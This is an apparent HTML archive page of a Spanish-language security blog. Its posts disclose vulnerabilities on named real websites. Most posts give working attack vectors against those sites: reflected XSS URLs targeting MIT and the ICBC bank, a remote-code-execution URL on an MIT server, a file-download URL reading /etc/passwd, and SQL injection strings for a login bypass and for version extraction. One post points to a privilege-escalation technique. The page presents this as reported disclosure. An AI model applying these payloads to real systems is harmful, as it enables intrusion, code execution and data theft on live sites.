@@ -1,0 +1,426 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="En esta entrada voy a dejar una presentación mostrando el uso de unix-privesc-check, y como a veces es factible su uso en sistemas mal configurados. &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/posts/5/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/rooteando-sin-local-exploit/">Rooteando Sin Local Exploit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T03:52:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:52 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://jagoancengeng.files.wordpress.com/2013/02/root.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://jagoancengeng.files.wordpress.com/2013/02/root.jpg" height="400" width="640" /></a></div><div style="text-align: center;"><br /></div><br />En esta entrada voy a dejar una presentación mostrando el uso de <span style="color: red;">unix-privesc-check</span>, y como a veces es factible su uso en sistemas mal configurados.<br /><br />En el documento muestro como&nbsplogro&nbspconseguir&nbspacceso&nbsproot&nbspen&nbspel&nbspservidor sin tener que hacer uso de ningun exploit publico o privado.<br /><br /><center><iframe allowfullscreen="" frameborder="0" height="510" marginheight="0" marginwidth="0" scrolling="no" src="//www.slideshare.net/slideshow/embed_code/13588448" style="border-width: 1px; border: 1px solid #CCC; margin-bottom: 5px; max-width: 100%;" width="477"> </iframe> <br /><div style="margin-bottom: 5px;"><b></b> <br /><center></center></div><br /><div style="text-align: left;">Para complentar un poco mas con este temas, les dejo tambien un articulo interesante que muestra otra de las tantas maneras en las que se puede aprovechar un fallo para elevar privilegios en un sistema comprometido.</div><br /><div style="text-align: left;">Los invito a pasarse por la web de <a href="http://alguienenlafisi.blogspot.com.ar/2012/08/fake-script-su.html">AlguienEnLaFisi</a> en la que se encuentra muy buena calidad de información avanzada.<br /><br />Recomendado:<br /><a href="http://alguienenlafisi.blogspot.com.ar/2012/08/fake-script-su.html">http://alguienenlafisi.blogspot.com.ar/2012/08/fake-script-su.html</a></div><br /></center><div style="text-align: right;">Bytes! </div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/xss-httpblogunderc0deorg/">XSS http://blog.underc0de.org</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T03:18:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:18 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-KZzTHpuK0rE/VLZHv67v-xI/AAAAAAAAAM0/693zzruNTcc/s1600/xss.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-KZzTHpuK0rE/VLZHv67v-xI/AAAAAAAAAM0/693zzruNTcc/s1600/xss.png" height="348" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />XSS<br /><br />Sitio: <a href="http://blog.underc0de.org/">http://blog.underc0de.org</a><br />Vector: &lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT<br />Autor: hdbreaker<br /><br />PD: Lo gracioso de este XSS esta dato por el sitio, una importante comunidad de hackers que no fixea este XSS aunque lleve meses de reportado. <br />Además realice una publicación paso a paso de como explotar el fallo y en vez de fixearlo, me eliminaron el post! </div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/remote-code-execution-mit/">Remote Code Execution MIT</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:38 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i45.tinypic.com/1y2vk8.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i45.tinypic.com/1y2vk8.png" height="358" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />RCE:<br /><br />Sitio: <a href="http://math.mit.edu/">http://math.mit.edu/</a><br />Vector: <a href="http://math.mit.edu/~numericalmath/exec_php.php?eq=ls+-l">http://math.mit.edu/~numericalmath/exec_php.php?eq=ls+-l</a><br />Autor: hdbreaker<br /><br />Respuesta del SysAdmin:<br /><br /><div style="text-align: center;"><a href="http://i47.tinypic.com/28h3pmt.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i47.tinypic.com/28h3pmt.png" height="148" width="640" /></a></div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/arbitrary-file-download-mit/">Arbitrary File Download MIT</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:35:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:35 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i48.tinypic.com/sauosm.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i48.tinypic.com/sauosm.png" height="358" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />AFD<br /><br />Sitio: <a href="http://alum.mit.edu/">http://alum.mit.edu/</a><br />Vector: <a href="http://alum.mit.edu/bvr/download_img.php?file=/etc/passwd">http://alum.mit.edu/bvr/download_img.php?file=/etc/passwd</a><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/xss-massachusetts-institute-of/">XSS Massachusetts Institute of Technology</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:33 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i48.tinypic.com/2hx2iqu.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i48.tinypic.com/2hx2iqu.png" height="356" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />XSS:<br /><br />Sitio: <a href="http://events.mit.edu/">http://events.mit.edu/</a><br /><br />Vector: <br /><a href="http://events.mit.edu/searchresults.html?fulltext=%22%3E--%3E%3Cscript%3Ealert%28%22HD_Breaker%20for%20Aaron%20Schwartz%22%29%3C%2Fscript%3E%3C!--&amp;andor=and&amp;start.month=01&amp;start.day=22&amp;start.year=2013&amp;end.month=02&amp;end.day=22&amp;end.year=2013">http://events.mit.edu/searchresults.html?fulltext=%22%3E--%3E%3Cscript%3Ealert%28%22HD_Breaker%20for%20Aaron%20Schwartz%22%29%3C%2Fscript%3E%3C!--&amp;andor=and&amp;start.month=01&amp;start.day=22&amp;start.year=2013&amp;end.month=02&amp;end.day=22&amp;end.year=2013</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/xss-httpiphoneapplicationlistcom/">XSS http://iphoneapplicationlist.com</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:31:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:31 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/1GT9stU.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/1GT9stU.png" height="400" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />XSS<br /><br />Sitio: <a href="http://iphoneapplicationlist.com/">http://iphoneapplicationlist.com</a><br /><br />Vector: <br /><a href="http://iphoneapplicationlist.com/search/?type=all&amp;s=%22aa%22%3E%3Cscript%3Ealert%28String.fromCharCode%2891,81,93,51,114,86,91,48,93%29%29%3C/script%3E">http://iphoneapplicationlist.com/search/?type=all&amp;s=%22aa%22%3E%3Cscript%3Ealert%28String.fromCharCode%2891,81,93,51,114,86,91,48,93%29%29%3C/script%3E</a><br /><br />Autor: [Q]3rv[0]</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/xss-icbc/">XSS ICBC</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:30:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:30 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i39.tinypic.com/2yywn06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i39.tinypic.com/2yywn06.png" height="358" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados. <br /><br />XSS<br /><br /><br /><br />Sitio: <a href="http://www.icbc.com.ar/">http://www.icbc.com.ar</a><br /><br />Vector: <br /><a href="http://www.icbc.com.ar/institucional/buscador.do?QUERY=%22%3E%3Cimg+src%3D.+onerror%3Dprompt%28%2FHD_Breaker%2F%29%3E%3C%21--">http://www.icbc.com.ar/institucional/buscador.do?QUERY="&gt;&lt;img+src%3D.+onerror%3Dprompt%28%2FHD_Breaker%2F%29&gt;&lt;%21--</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/xss-reflected-zone-h/">XSS Reflected Zone-h</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:27:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:27 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/utKx2TP.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/utKx2TP.png" height="404" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />XSS<br /><br />Sitio: <a href="http://www.zone-h.org/">http://www.zone-h.org <cite class="_Rm"></cite></a><br /><br />Vector:<br />Al notificar una url con un fichero que contenga contenido javascript, el siguiente es cargado a travez de un iframe en el mirror y produce la ejecucion del alert .<br /><br />Autor: [Q]3rv[0] <br /><br />Creditos: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/bypass-login-socargentina-de-ing/">Bypass Login SocArgentina De Ing Molecular</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:24:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:24 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i46.tinypic.com/28i3seu.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i46.tinypic.com/28i3seu.png" height="358" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />SQLI<br /><br />Sitio: <a href="http://www.saib.org.ar/administracion/login.asp">http://www.saib.org.ar/administracion/login.asp</a><br />Vector: Usuario:&nbsp; ' or 1=1-- /// Password: ' or 1=1--<br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/14/sqli-error-based-campus-utn/">SQLI Error Based Campus UTN</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T02:23:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:23 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i45.tinypic.com/2eycf87.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i45.tinypic.com/2eycf87.png" height="358" width="640" /></a></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />SQLI Double Error Based:<br /><br />Sitio: <a href="http://campusvirtual.frsf.utn.edu.ar/">http://campusvirtual.frsf.utn.edu.ar/</a><br /><br />Vector: <br /><a href="http://campusvirtual.frsf.utn.edu.ar/aead_2013/aead_argentina/index.php?id_curso=1%20or%201%20group%20by%20concat_ws(0x7e,version(),floor(rand(0)*2))%20having%20min(0)--">http://campusvirtual.frsf.utn.edu.ar/aead_2013/aead_argentina/index.php?id_curso=1%20or%201%20group%20by%20concat_ws(0x7e,version(),floor(rand(0)*2))%20having%20min(0)--</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/6">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/4">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
